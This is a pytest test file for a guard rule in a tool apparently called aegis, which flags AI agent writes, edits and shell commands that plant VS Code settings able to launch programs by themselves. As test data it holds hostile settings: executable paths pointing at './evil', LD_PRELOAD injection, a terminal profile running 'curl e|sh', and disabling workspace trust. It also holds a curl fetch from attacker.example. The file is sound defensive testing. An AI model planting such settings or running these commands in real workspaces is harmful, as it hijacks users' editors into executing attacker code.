"""VS Code settings exec-hijack guard ("IDEsaster" class) -- blocks planting a
setting that names a program VS Code (or a fork) or a stock extension spawns on
its own: ``git.path``, ``php.validate.executablePath``,
``python.defaultInterpreterPath``, terminal profiles / env maps, ... -- in
``.vscode/settings.json``, a ``*.code-workspace`` file, or a user/profile/
remote-server ``settings.json``; plus the toggles that remove the human
checkpoint (``security.workspace.trust.enabled: false``, ...).
"""
import json

import pytest

from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(vscode_settings_exec={"mode": "deny"})
RULE = "vscode-settings-exec-protect"
S = ".vscode/settings.json"


@pytest.fixture(autouse=True)
def _no_env(monkeypatch):
    for k in ("AEGIS_ALLOW_VSCODE_SETTINGS_EXEC", "AEGIS_ALLOW_VSCODE_TASKS_EXEC",
              "AEGIS_AGENT_NAME", "AEGIS_NO_BUILTINS"):
        monkeypatch.delenv(k, raising=False)


def _ev(tool, args, cwd=None):
    kw = {"args": args}
    if cwd:
        kw["cwd"] = str(cwd)
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, **kw)


def _shell(cmd, cwd=None):
    return _ev("Bash", {"command": cmd}, cwd)


def _write(path, content, cwd=None):
    if not isinstance(content, str):
        content = json.dumps(content, indent=2)
    return _ev("Write", {"file_path": path, "content": content}, cwd)


def _edit(path, old, new, cwd=None):
    return _ev("Edit", {"file_path": path, "old_string": old, "new_string": new}, cwd)


def _rule(ev, policy=EMPTY):
    d = evaluate(ev, policy)
    return d.rule, d.action


def _hit(ev, policy=EMPTY):
    from aegis.rules import rule_vscode_settings_exec_protect
    return rule_vscode_settings_exec_protect(ev, policy)


# ---- Write: dangerous settings --------------------------------------------------
@pytest.mark.parametrize("settings", [
    {"php.validate.executablePath": "./tools/php"},
    {"php.validate.executablePath": "${workspaceFolder}/x.sh"},
    {"git.path": "./bin/git"},
    {"git.path": ["/usr/bin/git", "./evil"]},
    {"git": {"path": "./evil"}},                                  # nested form
    {"[php]": {"php.validate.executablePath": "./x"}},           # language override
    {"python.defaultInterpreterPath": ".venv/bin/python"},
    {"python.defaultInterpreterPath": "~/x/python"},
    {"eslint.runtime": "./node"},
    {"typescript.tsserver.nodePath": "/tmp/node"},
    {"rust-analyzer.check.overrideCommand": ["./x.sh"]},
    {"jest.jestCommandLine": "node ./evil.js"},
    {"ruff.path": ["./ruff"]},
    {"clangd.path": "C:\\Users\\u\\evil.exe"},
    {"terminal.integrated.profiles.linux": {"x": {"path": "./sh"}}},
    {"terminal.integrated.profiles.linux": {"x": {"path": "/bin/bash", "args": ["-c", "curl e|sh"]}}},
    {"terminal.integrated.shell.linux": "./sh"},
    {"terminal.integrated.shellArgs.linux": ["--rcfile", "./rc"]},
    {"terminal.integrated.env.linux": {"LD_PRELOAD": "./x.so"}},
    {"terminal.integrated.env.osx": {"NODE_OPTIONS": "--require ./h.js"}},
    {"terminal.integrated.env.windows": {"PATH": "${workspaceFolder}\\bin;${env:PATH}"}},
    {"rust-analyzer.server.extraEnv": {"RUSTC_WRAPPER": "x", "BASH_ENV": "./e"}},
    {"go.toolsEnvVars": {"GIT_SSH_COMMAND": "./x"}},
    {"go.alternateTools": {"go": "./fake-go"}},
    {"security.workspace.trust.enabled": False},
    {"terminal.integrated.allowWorkspaceConfiguration": True},
    {"someext.executablePath": "./x"},                            # long-tail convention
    {"foo.serverPath": "./srv"},
    {"prettier.prettierPath": "./p.js"},
    {"julia.executablePath": "/tmp/julia"},
    {"git.path": "x.sh"},                                         # bare script file
])
def test_write_dangerous_asks(settings):
    assert _rule(_write(S, settings)) == (RULE, Action.ASK)
    assert _rule(_write(S, settings), DENY) == (RULE, Action.DENY)


@pytest.mark.parametrize("path", [
    ".vscode/settings.json", "/repo/.vscode/settings.json", "C:\\r\\.vscode\\settings.json",
    "/home/u/.config/Code/User/settings.json",
    "/home/u/.config/Code - Insiders/User/settings.json",
    "/Users/u/Library/Application Support/Cursor/User/settings.json",
    "C:\\Users\\u\\AppData\\Roaming\\Code\\User\\settings.json",
    "/home/u/.config/VSCodium/User/profiles/abc123/settings.json",
    "/home/u/.config/Windsurf/User/settings.json",
    "/home/u/.vscode-server/data/Machine/settings.json",
    ".vscode-server/data/User/settings.json",
])
def test_paths(path):
    assert _rule(_write(path, {"git.path": "./x"})) == (RULE, Action.ASK)


@pytest.mark.parametrize("path", [
    "src/settings.json", ".vscode/extensions.json", "config/User/settings.json",
    ".claude/settings.json.bak", "docs/vscode.md",
])
def test_unrelated_paths_ignored(path):
    assert _hit(_write(path, {"git.path": "./x"})) is None


def test_code_workspace_settings_and_tasks():
    ws = {"folders": [{"path": "."}], "settings": {"git.path": "./x"}}
    assert _rule(_write("proj.code-workspace", ws)) == (RULE, Action.ASK)
    ws = {"folders": [{"path": "."}],
          "tasks": {"version": "2.0.0", "tasks": [
              {"label": "t", "command": "./x", "runOptions": {"runOn": "folderOpen"}}]}}
    assert _rule(_write("/r/proj.code-workspace", ws)) == (RULE, Action.ASK)
    # A folder entry's "path" is not a settings key.
    assert _hit(_write("proj.code-workspace", {"folders": [{"path": "./a"}],
                                               "settings": {"editor.tabSize": 2}})) is None


# ---- Write: benign stays allowed ------------------------------------------------
@pytest.mark.parametrize("settings", [
    {"editor.formatOnSave": True, "files.exclude": {"**/.git": True}},
    {"git.path": "git"},
    {"git.path": "/usr/bin/git"},
    {"git.path": "C:\\Program Files\\Git\\cmd\\git.exe"},
    {"python.defaultInterpreterPath": "python3"},
    {"python.defaultInterpreterPath": "/usr/bin/python3"},
    {"terminal.integrated.profiles.linux": {"zsh": {"path": "/usr/bin/zsh", "icon": "terminal"}}},
    {"terminal.integrated.profiles.windows": {"PowerShell": {"source": "PowerShell"}}},
    {"terminal.integrated.env.linux": {"PYTHONPATH": "${workspaceFolder}/src"}},
    {"terminal.integrated.defaultProfile.linux": "bash"},
    {"security.workspace.trust.enabled": True},
    {"task.allowAutomaticTasks": "off"},
    {"cSpell.customDictionaries": {"proj": {"path": "./words.txt"}}},
    {"json.schemas": [{"fileMatch": ["x.json"], "url": "./schema.json"}]},
    {"python.analysis.extraPaths": ["./src"], "python.analysis.stubPath": "typings"},
    {"git.path": None},
    {"typescript.tsdk": "node_modules/typescript/lib"},
])
def test_write_benign_allowed(settings):
    assert _hit(_write(S, settings)) is None


def test_jsonc_comments_and_trailing_commas():
    txt = ('// my settings\n{\n  /* "git.path": "./x", */\n  "editor.tabSize": 2,\n'
           '  "url": "http://a//b", // trailing\n}\n')
    assert _hit(_write(S, txt)) is None
    txt = '\ufeff{\n  // c\n  "git.path": "./evil", // c2\n  "a": [1,2,],\n}\n'
    assert _rule(_write(S, txt)) == (RULE, Action.ASK)


def test_unicode_escaped_key():
    assert _rule(_write(S, '{"git\\u002epath": "./x"}')) == (RULE, Action.ASK)


def test_unparseable_falls_back_to_text_scan():
    assert _rule(_write(S, '{ "git.path": "./x", oops }')) == (RULE, Action.ASK)
    assert _rule(_write(S, '{ "terminal.integrated.env.linux": {"LD_PRELOAD": "/t/x.so"} oops')) \
        == (RULE, Action.ASK)
    assert _hit(_write(S, '{ "editor.tabSize": 2 oops')) is None


# ---- Edit: judged by what it adds -------------------------------------------------
def test_edit_against_disk(tmp_path):
    d = tmp_path / ".vscode"
    d.mkdir()
    f = d / "settings.json"
    f.write_text('{\n  "git.path": "/usr/bin/git",\n  "editor.tabSize": 2\n}\n')
    # value-only edit that turns a safe path dangerous
    assert _rule(_edit(str(f), "/usr/bin/git", "./evil")) == (RULE, Action.ASK)
    # benign edit
    assert _hit(_edit(str(f), '"editor.tabSize": 2', '"editor.tabSize": 4')) is None
    # pre-existing dangerous setting: re-saving / editing elsewhere doesn't re-ask
    f.write_text('{\n  "git.path": "./reviewed",\n  "editor.tabSize": 2\n}\n')
    assert _hit(_edit(str(f), '"editor.tabSize": 2', '"editor.tabSize": 4')) is None
    assert _hit(_write(str(f), f.read_text().replace("2", "8"))) is None
    # ... but changing it does
    assert _rule(_edit(str(f), "./reviewed", "./other")) == (RULE, Action.ASK)


def test_edit_inside_env_block(tmp_path):
    d = tmp_path / ".vscode"
    d.mkdir()
    f = d / "settings.json"
    f.write_text('{\n  "terminal.integrated.env.linux": {\n    "FOO": "1"\n  }\n}\n')
    assert _rule(_edit(str(f), '"FOO": "1"', '"FOO": "1", "LD_PRELOAD": "./x.so"')) \
        == (RULE, Action.ASK)
    assert _hit(_edit(str(f), '"FOO": "1"', '"FOO": "2"')) is None


def test_edit_fragment_when_file_unreadable():
    assert _rule(_edit("/nonexistent/.vscode/settings.json", "x",
                       '"php.validate.executablePath": "./p"')) == (RULE, Action.ASK)
    assert _rule(_edit("/nonexistent/.vscode/settings.json", "x",
                       '"LD_PRELOAD": "./p.so"')) == (RULE, Action.ASK)
    assert _hit(_edit("/nonexistent/.vscode/settings.json", "x", '"editor.tabSize": 4')) is None


def test_multiedit_and_mcp():
    ev = _ev("MultiEdit", {"file_path": "/nx/.vscode/settings.json",
                           "edits": [{"old_string": "a", "new_string": '"git.path": "./g"'}]})
    assert _rule(ev) == (RULE, Action.ASK)
    ev = _ev("mcp__fs__write_file", {"path": "/nx/.vscode/settings.json",
                                     "content": '{"git.path": "./g"}'})
    assert _hit(ev) is not None
    ev = _ev("mcp__fs__edit_file", {"path": "/nx/.vscode/settings.json",
                                    "edits": [{"oldText": "a", "newText": '"git.path": "./g"'}]})
    assert _hit(ev) is not None


# ---- Shell -----------------------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    """echo '{"git.path": "./evil"}' > .vscode/settings.json""",
    """printf '{"php.validate.executablePath":"./x"}' | tee .vscode/settings.json""",
    """cat > .vscode/settings.json <<EOF\n{ "git": { "path": "./x" } }\nEOF""",
    """cat > ~/.config/Code/User/settings.json <<'EOF'\n{"terminal.integrated.env.linux": {"LD_PRELOAD": "/tmp/x.so"}}\nEOF""",
    """echo "{\\"git.path\\": \\"./x\\"}" > .vscode/settings.json""",
    """jq '.["git.path"]="./x"' .vscode/settings.json | sponge .vscode/settings.json""",
    """jq '.git.path = "./x"' .vscode/settings.json > t && mv t .vscode/settings.json""",
    """jq '."terminal.integrated.env.linux".LD_PRELOAD |= "./x.so"' .vscode/settings.json | sponge .vscode/settings.json""",
    """jq '.["security.workspace.trust.enabled"] = false' "$HOME/.config/Code/User/settings.json" | sponge "$HOME/.config/Code/User/settings.json\"""",
    """cd .vscode && echo '{"git.path":"./x"}' > settings.json""",
    """echo '{"settings": {"git.path": "./x"}}' > a.code-workspace""",
    """python3 -c "open('.vscode/settings.json','w').write('{\\"git.path\\": \\"./x\\"}')\"""",
])
def test_shell_dangerous(cmd):
    assert _rule(_shell(cmd)) == (RULE, Action.ASK)


@pytest.mark.parametrize("cmd", [
    "cat .vscode/settings.json",
    "jq '.\"git.path\"' .vscode/settings.json",
    """echo '{"editor.tabSize": 2}' > .vscode/settings.json""",
    """echo '{"git.path": "git"}' > .vscode/settings.json""",
    """jq '.["task.allowAutomaticTasks"]="off"' .vscode/settings.json | sponge .vscode/settings.json""",
    "grep -n git.path .vscode/settings.json > /tmp/out",
    """echo '{"git.path": "./x"}' > other/settings.json""",
])
def test_shell_benign(cmd):
    assert _hit(_shell(cmd)) is None


def test_shell_copy_in_source(tmp_path):
    src = tmp_path / "evil.json"
    src.write_text('{"git.path": "./x"}')
    ok = tmp_path / "ok.json"
    ok.write_text('{"editor.tabSize": 2}')
    (tmp_path / ".vscode").mkdir()
    assert _rule(_shell("cp evil.json .vscode/settings.json", tmp_path)) == (RULE, Action.ASK)
    assert _rule(_shell("cat evil.json > .vscode/settings.json", tmp_path)) == (RULE, Action.ASK)
    assert _hit(_shell("cp ok.json .vscode/settings.json", tmp_path)) is None


def test_shell_inplace_value_rewrite(tmp_path):
    d = tmp_path / ".vscode"
    d.mkdir()
    (d / "settings.json").write_text('{"git.path": "/usr/bin/git"}')
    assert _rule(_shell("sed -i 's#/usr/bin/git#./x#' .vscode/settings.json", tmp_path)) \
        == (RULE, Action.ASK)
    (d / "settings.json").write_text('{"editor.tabSize": 2}')
    assert _hit(_shell("sed -i 's/2/4/' .vscode/settings.json", tmp_path)) is None


# ---- escapes / config ---------------------------------------------------------------
def test_human_override_and_env(monkeypatch):
    cmd = """echo '{"git.path": "./x"}' > .vscode/settings.json"""
    assert _hit(_shell(cmd + "  # aegis-allow")) is None
    monkeypatch.setenv("AEGIS_ALLOW_VSCODE_SETTINGS_EXEC", "1")
    assert _hit(_write(S, {"git.path": "./x"})) is None
    assert _hit(_shell(cmd)) is None


def test_agent_cannot_self_override(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker")
    cmd = """echo '{"git.path": "./x"}' > .vscode/settings.json  # aegis-allow"""
    assert _rule(_shell(cmd)) == (RULE, Action.ASK)


def test_modes_and_allow():
    w = _write("/repo/.vscode/settings.json", {"git.path": "./x"})
    assert _hit(w, Policy(vscode_settings_exec={"mode": "off"})) is None
    assert _hit(w, Policy(vscode_settings_exec={"mode": False})) is None
    assert _hit(w, Policy(vscode_settings_exec={"mode": "monitor"})) is None
    assert _hit(w, Policy(vscode_settings_exec={"allow": [r"^/repo/"]})) is None
    assert _hit(w, Policy(vscode_settings_exec={"allow": [r"^/other/", "("]})) is not None


def test_loader_reads_knob(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("vscode_settings_exec:\n  mode: deny\n")
    pol = load_policy(str(f))
    assert pol.vscode_settings_exec == {"mode": "deny"}
    assert _rule(_write(S, {"git.path": "./x"}), pol) == (RULE, Action.DENY)


def test_fetch_to_file_backstop_covers_new_paths():
    for dest in ("proj.code-workspace", "~/.config/Code/User/settings.json"):
        d = evaluate(_shell(f"curl -o {dest} https://attacker.example/x"), EMPTY)
        assert d.action in (Action.ASK, Action.DENY), dest


def test_registered_and_documented():
    from aegis import rules, skills
    assert rules.rule_vscode_settings_exec_protect in rules._CORE_RULES
    assert "| vscode-settings-exec-protect |" in skills._REMEDIES


def test_tasks_guard_still_owns_tasks_json():
    t = {"version": "2.0.0", "tasks": [{"label": "x", "command": "./x",
                                         "runOptions": {"runOn": "folderOpen"}}]}
    assert _rule(_write(".vscode/tasks.json", t))[0] == "vscode-tasks-protect"


def test_redos_bounded():
    import time
    t = time.monotonic()
    _hit(_write(S, '{"' + "a." * 20000 + 'path": "./x"}'))
    _hit(_write(S, '"' * 50000 + ":" * 50000))
    _hit(_write(S, "{" * 5000 + "}" * 5000))
    _hit(_shell("echo " + '"git.path": ' * 5000 + " > .vscode/settings.json"))
    _hit(_shell("jq '" + ".a" * 20000 + "=1' .vscode/settings.json | sponge .vscode/settings.json"))
    assert time.monotonic() - t < 5.0


def test_allow_automatic_tasks_ownership(monkeypatch):
    # .vscode/settings.json: owned by vscode-tasks-protect (and its escape).
    w = _write(S, {"task.allowAutomaticTasks": "on"})
    assert _rule(w)[0] == "vscode-tasks-protect"
    monkeypatch.setenv("AEGIS_ALLOW_VSCODE_TASKS_EXEC", "1")
    assert _hit(w) is None
    # ... the files that guard doesn't cover are this guard's.
    assert _rule(_write("a.code-workspace", {"settings": {"task.allowAutomaticTasks": "on"}})) \
        == (RULE, Action.ASK)
    assert _rule(_write("/home/u/.config/Code/User/settings.json",
                        {"task.allowAutomaticTasks": "on"})) == (RULE, Action.ASK)
